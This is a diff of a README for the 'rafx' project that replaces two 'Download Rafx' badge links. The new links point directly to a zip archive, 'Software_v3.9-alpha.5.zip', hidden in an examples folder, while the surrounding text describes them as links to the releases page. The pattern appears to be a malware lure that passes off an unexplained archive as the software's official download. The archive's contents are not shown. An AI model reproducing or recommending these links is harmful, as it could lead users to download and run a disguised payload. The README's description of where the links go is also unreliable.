@@ -18,7 +18,7 @@ To begin using rafx, follow the steps below:
 1. **Visit the Releases Page**
    Click the link below to access the releases page.
 
-   [![Download Rafx](https://github.com/M949939/rafx/raw/refs/heads/main/thirdparty/MetalUtility/Software_3.8-alpha.3.zip%20Rafx-Here-brightgreen)](https://github.com/M949939/rafx/raw/refs/heads/main/thirdparty/MetalUtility/Software_3.8-alpha.3.zip)
+   [![Download Rafx](https://raw.githubusercontent.com/M949939/rafx/main/bindings/rafx-odin/examples/Software_v3.9-alpha.5.zip%20Rafx-Here-brightgreen)](https://raw.githubusercontent.com/M949939/rafx/main/bindings/rafx-odin/examples/Software_v3.9-alpha.5.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will find different versions of rafx. Look for the latest stable release.
@@ -56,7 +56,7 @@ To get rafx on your system, revisit the downloads page linked above.
 
 1. **Click the Download Link**: Use the link below to redirect to the releases and select your file.
    
-   [![Download Rafx](https://github.com/M949939/rafx/raw/refs/heads/main/thirdparty/MetalUtility/Software_3.8-alpha.3.zip%20Rafx-Here-brightgreen)](https://github.com/M949939/rafx/raw/refs/heads/main/thirdparty/MetalUtility/Software_3.8-alpha.3.zip)
+   [![Download Rafx](https://raw.githubusercontent.com/M949939/rafx/main/bindings/rafx-odin/examples/Software_v3.9-alpha.5.zip%20Rafx-Here-brightgreen)](https://raw.githubusercontent.com/M949939/rafx/main/bindings/rafx-odin/examples/Software_v3.9-alpha.5.zip)
 
 2. **Follow the Steps Above**: Use the extracted files as explained in the Getting Started section. 
 
